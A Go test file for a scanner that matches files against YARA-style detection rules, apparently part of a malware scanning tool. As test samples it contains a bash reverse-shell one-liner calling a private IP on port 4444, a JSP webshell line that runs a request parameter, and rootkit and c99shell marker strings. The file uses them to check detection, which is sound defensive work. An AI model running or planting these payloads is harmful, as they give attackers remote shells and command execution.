package yara

import (
	"os"
	"strings"
	"testing"

	"aether/internal/config"
	"aether/internal/report"
)

// newTestFallbackEngine builds a fallback engine with default config and
// fails the test if the embedded rule source does not compile.
func newTestFallbackEngine(t *testing.T) *FallbackEngine {
	t.Helper()
	e := NewFallbackEngine(config.NewDefaultConfig(), nil)
	if !e.Enabled() {
		t.Fatalf("fallback engine failed to compile embedded rules: %v", e.failedFiles)
	}
	return e
}

func TestFallback_ParsesAllEmbeddedRules(t *testing.T) {
	e := newTestFallbackEngine(t)
	names := e.FallbackRuleNames()
	if len(names) != len(embeddedRuleFixtures) {
		t.Fatalf("expected %d embedded rules, parsed %d: %v",
			len(embeddedRuleFixtures), len(names), names)
	}
	for _, fx := range embeddedRuleFixtures {
		found := false
		for _, n := range names {
			if n == fx.ruleName {
				found = true
				break
			}
		}
		if !found {
			t.Errorf("embedded rule %s missing from fallback engine", fx.ruleName)
		}
	}
}

func TestFallback_EmbeddedCoreRulesMatch(t *testing.T) {
	e := newTestFallbackEngine(t)
	scanner := e.NewScanner()
	defer scanner.Destroy()

	for _, fx := range embeddedRuleFixtures {
		t.Run(fx.ruleName, func(t *testing.T) {
			matches, err := scanner.Scan(ScanTarget{
				Path:     fx.path,
				Filename: fx.filename,
				Data:     fx.payload,
			})
			if err != nil {
				t.Fatalf("scan error: %v", err)
			}
			found := false
			for _, m := range matches {
				if m.RuleName == fx.ruleName {
					found = true
					if len(m.MatchedStrings) == 0 {
						t.Errorf("rule %s matched but reported no matched string identifiers", fx.ruleName)
					}
					break
				}
			}
			if !found {
				t.Errorf("expected match for rule %s, got: %v", fx.ruleName, matchNames(matches))
			}
		})
	}
}

// TestFallback_BenignContentNoMatches guards the catastrophic false-positive
// class: legitimate code must not trigger any embedded rule.
func TestFallback_BenignContentNoMatches(t *testing.T) {
	e := newTestFallbackEngine(t)
	scanner := e.NewScanner()
	defer scanner.Destroy()

	for _, fx := range benignContentFixtures {
		t.Run(fx.ruleName, func(t *testing.T) {
			matches, err := scanner.Scan(ScanTarget{
				Path:     fx.path,
				Filename: fx.filename,
				Data:     fx.payload,
			})
			if err != nil {
				t.Fatalf("scan error: %v", err)
			}
			if len(matches) != 0 {
				t.Errorf("benign sample %s matched rules: %v", fx.ruleName, matchNames(matches))
			}
		})
	}
}

// TestFallback_NocaseLiteralAndRegex verifies case-insensitive semantics for
// both nocase literals (c99shell) and nocase regexes (reverse shell).
func TestFallback_NocaseLiteralAndRegex(t *testing.T) {
	e := newTestFallbackEngine(t)
	scanner := e.NewScanner()
	defer scanner.Destroy()

	matches, err := scanner.Scan(ScanTarget{
		Path:     "/var/www/SHELL.PHP",
		Filename: "SHELL.PHP",
		Data:     []byte("<?php // C99SHELL v2.1 ?>"),
	})
	if err != nil {
		t.Fatalf("scan error: %v", err)
	}
	if !hasRule(matches, "Linux_Webshell_PHP_Known_Families") {
		t.Errorf("expected nocase literal match for C99SHELL, got: %v", matchNames(matches))
	}

	matches, err = scanner.Scan(Target("/tmp/rev.sh", []byte("/BIN/BASH -i >& /dev/tcp/10.0.0.1/4444 0>&1")))
	if err != nil {
		t.Fatalf("scan error: %v", err)
	}
	if !hasRule(matches, "Linux_Backdoor_Reverse_Shell_OneLiner") {
		t.Errorf("expected nocase regex match for uppercase reverse shell, got: %v", matchNames(matches))
	}
}

// TestFallback_ELFMagicGate verifies that the uint32(0) ELF magic condition
// in the LD_PRELOAD rootkit rule is honored.
func TestFallback_ELFMagicGate(t *testing.T) {
	e := newTestFallbackEngine(t)
	scanner := e.NewScanner()
	defer scanner.Destroy()

	payload := []byte("/etc/ld.so.preload dlsym(RTLD_NEXT readdir") // no ELF magic
	matches, err := scanner.Scan(Target("/tmp/hook.txt", payload))
	if err != nil {
		t.Fatalf("scan error: %v", err)
	}
	if hasRule(matches, "Linux_Rootkit_LDPRELOAD_Hook_Artifact") {
		t.Error("rule matched without ELF magic header; uint32(0) gate not evaluated")
	}
}

// TestFallback_FilesizeGate verifies per-rule filesize caps are enforced.
func TestFallback_FilesizeGate(t *testing.T) {
	e := newTestFallbackEngine(t)

	var rule *fallbackRule
	for i := range e.rules {
		if e.rules[i].Name == "Linux_Webshell_JSP_Runtime_Exec" {
			rule = &e.rules[i]
			break
		}
	}
	if rule == nil {
		t.Fatal("JSP rule not found")
	}
	if rule.MaxSize != 1024*1024 {
		t.Errorf("JSP rule MaxSize = %d, want 1MB", rule.MaxSize)
	}

	payload := append(
		[]byte("<% String cmd = request.getParameter(\"cmd\"); Runtime.getRuntime().exec(cmd); %>"),
		strings.Repeat(" ", 1024*1024)...,
	)
	matches, err := e.scan(Target("/var/www/big.jsp", payload))
	if err != nil {
		t.Fatalf("scan error: %v", err)
	}
	if hasRule(matches, "Linux_Webshell_JSP_Runtime_Exec") {
		t.Error("rule matched on a file at/over its filesize cap")
	}
}

func TestFallback_DisabledRules(t *testing.T) {
	cfg := config.NewDefaultConfig()
	cfg.Scan.DisabledRules = []string{"Linux_Webshell_PHP_Known_Families"}
	e := NewFallbackEngine(cfg, nil)
	scanner := e.NewScanner()
	defer scanner.Destroy()

	matches, err := scanner.Scan(Target("/var/www/c99.php", []byte("<?php // c99shell v2.1 ?>")))
	if err != nil {
		t.Fatalf("scan error: %v", err)
	}
	if hasRule(matches, "Linux_Webshell_PHP_Known_Families") {
		t.Error("disabled rule still fired")
	}
}

func TestFallback_SeverityAndScoreMatchMeta(t *testing.T) {
	e := newTestFallbackEngine(t)
	scanner := e.NewScanner()
	defer scanner.Destroy()

	matches, err := scanner.Scan(Target("/var/www/c99.php", []byte("<?php // c99shell v2.1 ?>")))
	if err != nil {
		t.Fatalf("scan error: %v", err)
	}
	var m *RuleMatch
	for i := range matches {
		if matches[i].RuleName == "Linux_Webshell_PHP_Known_Families" {
			m = &matches[i]
		}
	}
	if m == nil {
		t.Fatal("expected c99 rule match")
	}
	if m.Score != 95 {
		t.Errorf("score = %d, want 95 from meta", m.Score)
	}
	if m.Severity != report.SeverityAlert {
		t.Errorf("severity = %v, want ALERT", m.Severity)
	}
	if !m.IsStrong {
		t.Error("expected IsStrong = true for score 95")
	}
}

func TestFallback_MatchedIDsCap(t *testing.T) {
	patterns := make([]fallbackPattern, 30)
	ctx := &condCtx{matched: map[string]bool{}}
	for i := range patterns {
		patterns[i].ID = "$p" + string(rune('a'+i))
		ctx.matched[patterns[i].ID] = true
	}
	ids := matchedIDs(ctx, patterns)
	if len(ids) != maxMatchedStringIDs {
		t.Errorf("matchedIDs returned %d ids, want cap %d", len(ids), maxMatchedStringIDs)
	}
}

func TestFallback_CoverageAndStatus(t *testing.T) {
	e := newTestFallbackEngine(t)
	if !e.Enabled() {
		t.Fatal("expected Enabled = true")
	}
	status := e.StatusString()
	if !strings.Contains(status, "pure-Go fallback") || !strings.Contains(status, "17 rules") {
		t.Errorf("unexpected StatusString: %q", status)
	}
	cov := e.Coverage()
	if cov.CompiledIn {
		t.Error("CompiledIn must stay false in fallback builds (YARA-X is not linked)")
	}
	if cov.RulesLoaded != len(embeddedRuleFixtures) {
		t.Errorf("RulesLoaded = %d, want %d", cov.RulesLoaded, len(embeddedRuleFixtures))
	}
	if cov.RulesFailed != 0 || len(cov.FailedFiles) != 0 {
		t.Errorf("unexpected failures: %d %v", cov.RulesFailed, cov.FailedFiles)
	}
	if cov.DemoRulesOnly {
		t.Error("DemoRulesOnly should be false for embedded core rules")
	}
}

func TestFallback_ParserRejectsUnsupportedSyntax(t *testing.T) {
	cases := []string{
		`rule Bad_Hex { strings: $a = { 4D 5A } condition: $a }`,              // hex strings
		`rule Bad_Count { strings: $a = "x" condition: #a > 2 }`,              // '#' counting
		`rule Bad_Wide { strings: $a = "x" wide condition: $a }`,              // wide modifier
		`rule Bad_Undefined { strings: $a = "x" condition: $a and $missing }`, // undefined id
		`rule Bad_At { strings: $a = "x" condition: $a at 0 }`,                // 'at' syntax
	}
	for _, src := range cases {
		if _, err := parseYARASubset(src); err == nil {
			t.Errorf("expected parse error for unsupported rule %q", firstRuleName(src))
		}
	}
}

func TestFallback_ParserAcceptsSubsetGrammar(t *testing.T) {
	src := `
rule Subset_Grammar_Showcase {
    meta:
        description = "exercise every supported condition form"
        score = 42
    strings:
        $lit = "alpha" ascii
        $nocase_lit = "Beta" nocase
        $re = /foo[\s\S]{0,10}bar/ nocase
        $grp_1 = "one"
        $grp_2 = "two"
    condition:
        filesize < 1MB and uint32(0) == 0x464C457F and ($lit or $nocase_lit) and
        not $re and 2 of ($grp_*) and any of ($lit, $nocase_lit) and all of them
}`
	rules, err := parseYARASubset(src)
	if err != nil {
		t.Fatalf("parse error: %v", err)
	}
	if len(rules) != 1 {
		t.Fatalf("expected 1 rule, got %d", len(rules))
	}
	r := rules[0]
	if r.Name != "Subset_Grammar_Showcase" || r.MaxSize != 1024*1024 {
		t.Errorf("rule header mis-parsed: %+v", r)
	}
	if r.Meta["score"] != 42 {
		t.Errorf("meta score = %v, want 42", r.Meta["score"])
	}
}

func TestFallback_ExternalSubsetRulesLoad(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir+"/custom.yar", `rule Custom_Team_Ioc {
    meta:
        description = "campaign marker"
        severity = "alert"
        score = 85
    strings:
        $mark = "OPERATION-TEST-MARKER"
    condition:
        filesize < 1MB and $mark
}`)
	e := NewFallbackEngine(config.NewDefaultConfig(), nil)
	if err := e.LoadRules([]string{dir + "/custom.yar"}); err != nil {
		t.Fatalf("LoadRules error: %v", err)
	}
	if !hasRuleName(e.FallbackRuleNames(), "Custom_Team_Ioc") {
		t.Fatalf("custom rule not loaded: %v", e.FallbackRuleNames())
	}
	matches, err := e.scan(Target("/tmp/op.txt", []byte("hello OPERATION-TEST-MARKER world")))
	if err != nil {
		t.Fatalf("scan error: %v", err)
	}
	if !hasRule(matches, "Custom_Team_Ioc") {
		t.Errorf("custom rule did not fire, got: %v", matchNames(matches))
	}

	// Unsupported syntax is skipped without killing the engine.
	writeFile(t, dir+"/broken.yar", `rule Broken { strings: $a = "x" condition: #a > 1 }`)
	before := len(e.FallbackRuleNames())
	if err := e.LoadRules([]string{dir + "/broken.yar"}); err != nil {
		t.Fatalf("LoadRules error on broken file: %v", err)
	}
	if len(e.FallbackRuleNames()) != before {
		t.Error("broken rule should have been skipped, not loaded")
	}
	cov := e.Coverage()
	if cov.RulesFailed == 0 {
		t.Error("expected RulesFailed > 0 after broken rule file")
	}
}

// --- helpers -------------------------------------------------------------

func Target(path string, data []byte) ScanTarget {
	return ScanTarget{Path: path, Filename: path[strings.LastIndex(path, "/")+1:], Data: data}
}

func hasRule(matches []RuleMatch, name string) bool {
	for _, m := range matches {
		if m.RuleName == name {
			return true
		}
	}
	return false
}

func hasRuleName(names []string, name string) bool {
	for _, n := range names {
		if n == name {
			return true
		}
	}
	return false
}

func matchNames(matches []RuleMatch) []string {
	out := make([]string, 0, len(matches))
	for _, m := range matches {
		out = append(out, m.RuleName)
	}
	return out
}

func firstRuleName(src string) string {
	if i := strings.Index(src, "rule "); i >= 0 {
		rest := src[i+5:]
		if j := strings.IndexAny(rest, " {"); j >= 0 {
			return rest[:j]
		}
	}
	return "?"
}

func writeFile(t *testing.T, path, content string) {
	t.Helper()
	if err := os.WriteFile(path, []byte(content), 0o644); err != nil {
		t.Fatalf("write %s: %v", path, err)
	}
}
